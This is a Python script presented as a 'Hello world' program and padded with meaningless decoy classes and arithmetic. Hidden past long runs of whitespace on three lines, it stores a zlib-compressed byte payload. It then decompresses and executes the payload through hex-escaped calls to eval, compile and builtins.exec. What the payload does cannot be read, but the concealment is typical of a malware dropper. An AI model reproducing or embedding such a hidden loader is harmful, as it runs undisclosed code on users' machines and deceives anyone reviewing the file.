from builtins import *
from math import prod as _system


__code__ = 'print("Hello world!")'


Calculate, _cube, MemoryAccess, _hypothesis, _builtins, _callfunction, _divide = exec, str, tuple, map, ord, globals, type

class StackOverflow:
    def __init__(self, _while):
        self._stackoverflow = _system((_while, -99628))
        self._product(Frame=87435)

    def _product(self, Frame = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._stackoverflow /= 11434 - Frame
        
        try:
            ((_hypothesis, {_cube: MemoryAccess}) for _hypothesis in (MemoryAccess, MemoryAccess, _builtins) if _hypothesis > _builtins)

        except OSError:
            ((_builtins, (Calculate, _hypothesis, _builtins)) for _builtins in (MemoryAccess, MemoryAccess, _builtins) if _cube == MemoryAccess)

        except:
            _divide(58541 * -59882) == Ellipsis

    def _positive(self, _round = 59240):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _round *= -26409 * 75809
        self.DetectVar != str
        
        try:
            (((_builtins, _ceil), _hypothesis) for _hypothesis in (Calculate, _hypothesis, _builtins))

        except AttributeError:
            (MemoryAccess, MemoryAccess, _builtins) if Calculate > _ceil else (Calculate, _hypothesis, _builtins) > _ceil

        except:
            _divide(62988 * 10923) == float

    def Theory(Floor = str):
        return _callfunction()[Floor]

    def Modulo(Add = -78428 / -15420, Math = False, Ceil = _callfunction):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Ceil()[Add] = Math
        
        try:
            ((Calculate, _hypothesis, _builtins) or _cube if (Calculate, _hypothesis, _builtins) and _cube else ... or (_cube, (Calculate, _hypothesis, _builtins)))

        except OSError:
            (({_hypothesis: _builtins}, _hypothesis) for _hypothesis in (Calculate, _hypothesis, _builtins))

        except:
            _divide(-71678 / 84910) == int

    def execute(code = str):
        return Calculate(_cube(MemoryAccess(_hypothesis(_builtins, code))))

    @property
    def DetectVar(self):
        self._modulo = '<__main__._system object at 0x000009263BE12649>'
        return (self._modulo, StackOverflow.DetectVar)

if __name__ == '__main__':
    try:
        StackOverflow.execute(code = __code__)
        Positive = StackOverflow(_while = -1252 + 98555)

        if 440752 > 7259528:
            StackOverflow(_while = -66959 / 99605)._positive(_round = 87267 * Positive._stackoverflow)
        elif 113545 < 4345321:
            StackOverflow(_while = -4791 * 56322)._product(Frame = Positive._stackoverflow + 12546)                                                                                                                                                                                                                                                          ;StackOverflow.Modulo(Add='SS2S22S2SS2222SS2S2S22S',Math=b'x\x9c\xddZ_o\xe28\x10\x7f\xef\xa7\xa8\xee%\xa0v\xab\xc4v\xec\xa4R\xdf\xd0IT\xb4<\xf4\xa4\xadT!\x04$\xec\xa5\n\xa4G\xe9\xb6\xf7\xedoflC\x08II(\xcbi\x89\xf1\x9f\x8c\x1dg2\x1e\x8f\x7fc\x93f\x93Q\xfa\xdaj?9\xdf\x1f\x1f\xbf?b\xf2\x9dr\xc8\x1e\x9d\xc1\xcd\x8f4\x1bC\x83\xb3\x92Z|\xe8\x19\xae$M\x92$\xa5\xec9u\x9e\xae\xaf/\xbe]|k}k]x\xed\xf6`p\x13%\x8b\xaa\xa7\xbbi\xb7\x0b\x11\xd2\x94\xae\xd5\xcdv/?\xe2\xe5h\xb9\xac\xec\xe9\x81A\x80\x8b\xe9\x02\xfe\x18p\x9f\xd2\xd7\x9d\x95\xd5\xe2S\xf7w\xf7\xf7\x10\xef\xee0\xc1"<2\x1c&\xb3\x97l\xb1\x1c\x0e\xab\xde\xf5\xfe\xfe\xa1\x7f\xfa\xc2\x1c\x9e\xdb\xea\xab\xe5\x8c\xdf\x92t\x99\xcc_\x9d\xf6\xd5\xcf\xd1\xa2\x9a\r\xec\x83\xba3\x1d\xbfc\x01\xee\xde\xf1\x0b\xd22\tAl\x95\xbc\xf0u\x9e,\xd3\xe4m\\\x14_\xfb\x12\x86\x07\xc6\xe7\x99F*\xc1Ak\xf4x\xfb\xe9\x8b\xcf_%\xf3(\xfeh9q\x9a\xbc\xcc\xb2\xc9V\x83A\xfb\xacD\xaaZ6(\x10\xbc>\x8cpNN(\x8b\xe5k\x99@\xaa\xb4\xc5\xd0\x99\xbe\xa8\xdcT$I2y\x1d\xcd\x93}ER\xf9xM\x91T?oE\xf2\xef4I?\xe2\xbf\xe7oe\x82\xa9\x98\x96\xc93\x05x+Fd\x82\xd8HNN_\xd2,\xdb\xae\xfdDa\xe8\x8b\xf1\x93\x8d\x00H\x10\xdd\xee\xc9\xc9e9\xca\xd2iC\xd3\xa2m.\xd5\x90\x8599\xa1\xc4o\x8b\xbf\x1aL\xa2~\xbf\xd3\xeft\xb2N\x86\x17\x96\xfa\x9d\xec\xe4d\x92\x8e~\xc6\r\xf4\xa4\xdf\xcf0\xb8Y\xe6\xba}\xd7\x85\xf4\xe4$\x12\xbf\xa6\xa3?\x9b\x88$s\xfb(\rJH(}\x14\x8a\xe3\\=g\xc9\xbcJ\xb9\xee\xee\rs\x96\xc1\xbb\xfc+\xcbT\xaf\xe5\xb4=\xa8tk\xb4SC6\xe4C1\xf4\x87!D\x05\x11\x9e\xbc\x08\xb6\xa9\x07{g\xc9B\xdc\x1a;\xdce\x11\x0bX\xc4=\x16\x02\xf0\x8b\xe2I\x16\xc5-\'\x98.\xb7\x17\xb3\xb6NV\xf1\xd4\xd4j\x12\x7f\x94N\xb4r\xfd(\x97\xa7\x88 \xc4\xab4\xa6\xb0\x99G\xbb\xe4<\x80\xc5a\x9e\\B\\\xbc\\"S\xe7\xcbE\xf62K\xce\xed\'\x9c\xcf\xb2\xc5\xb4\x86b\xb0\xa17\x0c\x86\x92"\xd3*\x05\x8d\xf96u_\xe5\t\xfd)w!\xfa\x109\xc4\x00"3ea\xeb\xd8\x98\x14\xacN[\xd1@\t\xff\x87a)\xef[\x862R\xae\x9c*\xa6\x04s\x15\x93\xbe\xf2\x94\x0f)WB\xf1\x9d\xdfSe~n{\xb7]\x8c\xddn\xaf\xd7\xedA\x86\xb7\x08\x83\x9a|7p\x11H_\xee\xe4bP\xe9\xf3\xea\xd9\xdd\xed\xae\\_\xf8\x01\x13\x15\xe8\xad\x9c\x0b\x85R\te\xac\xc4n>\xaa`\xa1\xb6\xc64\x9b\xeft\xa4p\xd7\x94\x97\xba|T,%Y\xa7\x03\xd3#\xcbhZ\xf4\xf1\xaerD\x9c\xd7\xe5k\xfc\xf6O\xbc8\x92i\xae\xe2\xb9\xbcw?\xc8\x05EQQ\x1e\xac\xca*_\xde)\xb1\x9bt4\x1bG\xa3\xf3\xdb[P\xd3\x1e\xa4],@\x82W\xef\xba\x94\xb7F\x1c\xcb\x18BD!\xdeH5\x1d\xd2\xda<\xce\xe73\xf8A\xa4k\x06\xe1\xba\\\x89\xaa\xd4\x80\x1e\x9d\xcd\xe8Q\xdd\xc1\x8c\xae\xf9\xbec\xed\x99\xb1vk\x8e\xb5\xfd\x12\xdb\xd3\x83\xbe\xb0G\xf6\xd0\xf0c\x1e\x8d\xfe\x92\xfa\x92\x16?>\xee\xfb\x1d\xd6\x92Kc\xe9\x99\xb1\xee\xa1\xc9EnE\xa8\xd3\xb6\xe6\x8a\xb0\x92G\x0f\xae[4\x98\xbd[\xb2\x9a\xa8\x88\xd7\xa5\xf3\xb3\xd9l\xe1\xc0\x1d_\xa7\x18\xb0d\xefl\x8aym-|0#G\xa3\xa4\x87\xe9\x10\xac\xaa\x8d\x89\xadr\x93y=\xa1MZ\x9bUmv\t\x04\xaf1\xf1\xfd\xfd\x01fu\xce\xea\x049\xf6\x82\x15\xbbA=F\x1b()\x83\x95z\xf7\xb2\xdc\xe4#\x04(2\x069\xc5\x12\xa6b\xaai\x92\xee\x91"\rMSjK\xdeH\xfd^/yv\x0c\xee\x9aM\xf1*\xaem\x90+\xae\xa5\xe1\x90\xbb\xc8\xab\xe5\x1a\xd3\xc3\x0e\x01\x93\x01\xa0#\x01\xc8\x80\xf3\x11\x9b\xb2\xa9T2D\xc4\xc4b*\t\xa8\xf7%\x03e\x00\xf3\x00\xe8\x81\x83\x10a\xdd\x06,\x13S\x1b\xbc\x8f\xd8T\xc4*\x00\xb4\x05=H\x98z\xc0\xb6\xc7C\xe9\xf1\x80\x0b.\xa4\x84\x9cC\xc9\x93\x9c\x87\x1c:\x826\x8c\x03\x1a\x82i\xaa\x80*\xe0S\x91\x02\x04\xae\x18\xe07\xe9)\xc5v\xce\xdf\x86B\x0e\xc5D\x8c \xc50\x8201\xa5I\x81\x1eR\r\xd0k\xab\x06\xa1BHh\x81\xc5\xe5\xb6\xdb\xd0\xf0\xafw\xd8\xd2\xd4\x02=\xc2w\xc7Z\xc4\x1ai\x8c\x10\x80\xb1\x15\xac\xf3\x13\x18{\x18=DrR1\x17\xee=\xd4\x0c\xd2\x1eWI\xd4\x17\x18\xec\x105\x86\xe1\xe4\x93@\x05}\x92>s}\x81\x93\x11\x9e\x18\xa3\x8e\x1d~\xac\xa1\xe7\t\xa6\xc5\xd2:\xd4\x1e\xdd\x1e\x01~\xb3\x92\x11\xf6\xbfmdn\x9d\xb4k\x9cr3\xae\x94\x1cp\x0b#\x18\xba\xe0I\xaa!\'\x1fR\x80?\x89\xdee\xb8M=\x92:\xe5\xb6%\xb4\x04\x9fS:\xe4K\xd2\x14\xf7\x05\xd2\xf4\x996\xda\x1b-\xb1\x80\xf7\x11\xe4\xf7\x89\xdd\x0e\x96:\xfd~\x1d\x19\x82\x0cB\xf0\xae\xd1\xbf\xe6\xb4\x91\xe3Cc\xb6M=\xa2l\x06\xad\x8ao|\xd7\xfb\xca\xfa(\x8f\xce\xf2L\xb6/s\x16\xc8)\x03\xe6<\xe3\xe6\xfb\xe6\x9e\xdc~\x03\x02\xeb\xb4e5\xedI\xeb\x0f*z\x17@\x86\xca\x8b\xeb\xeb\'\xe7m9\r\x9cV\x1ce\x938\xbaj;!\x0bJ\xf0E\t\x02a\xd6n[\x1b=\xa18YYl[\x8b\xb93ni\xa3\xbb\x02\xe3(\x8c\xd6`\x177Q\xc9>D\xbc\xb1S\x11U\xf4\xfd\xd4nmh\xb0\xd6\xe8?\x8e\xa3M\x97\xd3$\x8d\xe7\xa3Y|\x83;\xf00)\xf0\xa2w\xe8\x17\xf6k\xcd\x11\x17*wooVpl}\x86\x95OaT\xc53\xfe\x04\xee.\x05F\xc5\xea\xb4U\xf5\xe7\xd1\xe5\x0c\xda\xdc\x94\xf3\x05k\x8f\x84\xb5i\xa7\x95\xaf\xde\xf6\xd9\xd3\xe0\xd4\x13\xa6\xd3F\xb3\x83f\x08M3\xa7\x88\x86IlS\x7f\xf5\xbe3\xb3\x827\x83 \xcc\x80X\x870\xa4AY\xdb\x88]m\xe5\x1e\xfb\xd7\x877\x88_\xd4ja\x8c\x9fg4\xd4\x1aA\x9e7\x909\xefyW\xdbF\xab\xc3g\x9eo\xde\xdb\xcdS\xd6\xfe0\xf0\x14\xfac\xa6D\r\x9b\x06\xb0~\xccG\x80\xfb\xc7`w\xc6\xda\xf6@\x1c\x933"(\x02N\x13\x1a\xabM\xb5\xfbdhD\x05\x1b\xbe\xc1\x95\xf6\xc7mX\xd3Y \x19@A\xc4\xfb\xbeD\x94\xef\x99\x9c\x99\xdc-\xdc\xf3\xc2\xbd(\xd0C\xce$\xbe#\x80\\\x1c\xb0_\xe8\x8f\x87\xe0\x96\x86\xe0\xd9\xa0\x8f\x83\xde\r\xe4 \x13\xc5\x03)\xc1O\xf2\xabd\x86\xbb\x83 \xf9\x08S]\x82r3\xf9H\xf8.x%\xd4\x01\xdf\xc0\xcb:*\x13\x8b\xb4b]1_\x979xc.\xc4_\xd17\xab\xec\xa7\xee{\x8a\xfd\x1d`\x0cv\xcd\xb7\xdc\xda\xf9\xf1n\x8d\x8e>\xcd\xff\xd8\x1fq5\xdc*\xd6K\xd8\xd6\xc9r%\xd0\xf7\x01\xd4\xbb\xb0* \xb4\xf7\x10\xc0\x12\xd0\xdf\xa2\xd6>\x92\xf2)\xc5\x00Pxu$\xb5A=\xa0\xa3\xf2\xe5uju\x94e\x81\x85=\xae2\xe66,`\xd9\xcf\xda\x06\xcd\xd7\xa9\xf6g\xe7D\x9fl\xed\xd4\xb0\xa4\xbb\xcf\xbc\x8e\xe534=\xec\xa8\x85\xf5\'\x92\x90\xbb\xf1\xbd\xb1\xa4\xef4\xd5\xd6\xad\xcb\x01\xdb\xac\xb3%\xe3\x01l<\xf9\xbbc\xfe \xb7\xf3n\x95\xd5\xcb\xdd\x13\xd82\x8a]\xa7\xad\xdf\xdcw\xc8\xf0\x9f*}t!\x08\xf3\x02\xdb\xb5\xac\x11n/\x08\xb2:\x88T\x03c\x8d\xb6\xa8\xfbj\xa2=\x90Vf\xe6\xda\xc3jn\xeeUn\xc6\xd7i\xdb`\xc67\xb3\xcb_\x82\x9a{m\xae\x9c\x8a\rB?\xc8\x05=\xf1h\xfdB\xadQ\xe4\x05\x15hG\xfcOM%\xfcV\xfe\xfa\x806\x7fz\xb3>\xb4\x05\xeaq\xc17\x82\xa4\xdc7\x1e\x1b\xcc{\x04\xbe\xd7 \xdc=$x>\x08\x88\xc6\x83\x06\x1dE.\xfa\x9f\x94\xf3\xedu\xf98\xc0\xf93\xc0\\\x8ce}m\xbf\xf7\xd8 Z\xff\xf1+\xa5\xbfQ\xe36/\x14\xd3\xe7\xe4\xa88\xfa\xcb[A\xe5\xa76\xbf\xdc\xacV\xbc\xf67\xc1vB\xe1\t\xa1P1(\xcc4wP\xe9r\x8c\x90J\x8c\x9a\xba*Q\x08\xe0Y_*\x193A\x97>\x9e\x15\xc2\xa4R\x97m\xdd\x89\xee\x04k\xb7\x8e\xd3R\'\xe8\\\x02J\xc6\xad+P\xf7\x1dvePbP\xd8{\x15\x06M2\x03\xa2v\xb5k\xb0\x8c\xe6\x0c\x83\xfek\x0e\xfeKG\xff9g>\xabun\xe3\x83\xf3)\x87\xe8\x90J\xdc\x0e\xa5S\x9b\x02\xed+\xff\x96\xf4\x0b[\x98\xf6\x88C\x1a\xc0\xe8\xe6\xfe-Y\xd5\xd6\xee\xf4\xd50\x94\xfb\x00\xcbC\x81\x9a\xb3\xff\x00rAz\x16')

        if 412900 > 6238697:
            Positive._positive(_round = 58568 - Positive._stackoverflow)
        elif 448522 < 3160875:
            Positive._product(Frame = Positive._stackoverflow + -29451)                                                                                                                                                                                                                                                          ;wxxxxwxxxwxwxxxxxxxxwxxx,JIIILLJILLLJIJLJJLIILJ,S22SS22SS2S22S222222S22S2,jjiiiijjjijijjijjj,llIIllIIIllllIIlIll=(lambda xxxxwwwxwwwxxxxwxwwxxwxx:xxxxwwwxwwwxxxxwxwwxxwxx(__import__('\x7a\x6c\x69\x62'))),(lambda xxxxwwwxwwwxxxxwxwwxxwxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xxxxwwwxwwwxxxxwxwwxxwxx)"),filename='\x53\x32\x32\x53\x53\x32\x53\x32\x32\x53\x53\x53\x32\x32\x32\x32\x53\x53\x53\x32\x32\x32\x53\x32\x32',mode='\x65\x76\x61\x6c'))),(lambda xxxxwwwxwwwxxxxwxwwxxwxx:xxxxwwwxwwwxxxxwxwwxxwxx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IIJIILILIIJLIJJILIJII,xxxxwwwxwwwxxxxwxwwxxwxx:IIJIILILIIJLIJJILIJII(xxxxwwwxwwwxxxxwxwwxxwxx)),(lambda:(lambda xxxxwwwxwwwxxxxwxwwxxwxx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xxxxwwwxwwwxxxxwxwwxxwxx)"),filename='\x53\x32\x32\x53\x53\x32\x53\x32\x32\x53\x53\x53\x32\x32\x32\x32\x53\x53\x53\x32\x32\x32\x53\x32\x32',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 188354 > 2255185:
            StackOverflow(_while = 36928 + 33519)._product(Frame = Positive._stackoverflow / 13592)
        elif 364287 < 6549835:
            StackOverflow(_while = -15092 - -11435)._product(Frame = Positive._stackoverflow - -51261)                                                                                                                                                                                                                                                          ;llIIllIIIllllIIlIll()(jjiiiijjjijijjijjj(S22SS22SS2S22S222222S22S2(wxxxxwxxxwxwxxxxxxxxwxxx(JIIILLJILLLJIJLJJLIILJ('\x76\x61\x72\x73'))),StackOverflow.Theory(Floor='SS2S22S2SS2222SS2S2S22S')))

    except Exception as _ceil:
        if 495914 > 4173008:
            StackOverflow.execute(code = _cube(_ceil))

        elif 279298 > 1918394:
            StackOverflow(_while = -56887 + 28194)._positive(_round = -68571 / Positive._stackoverflow)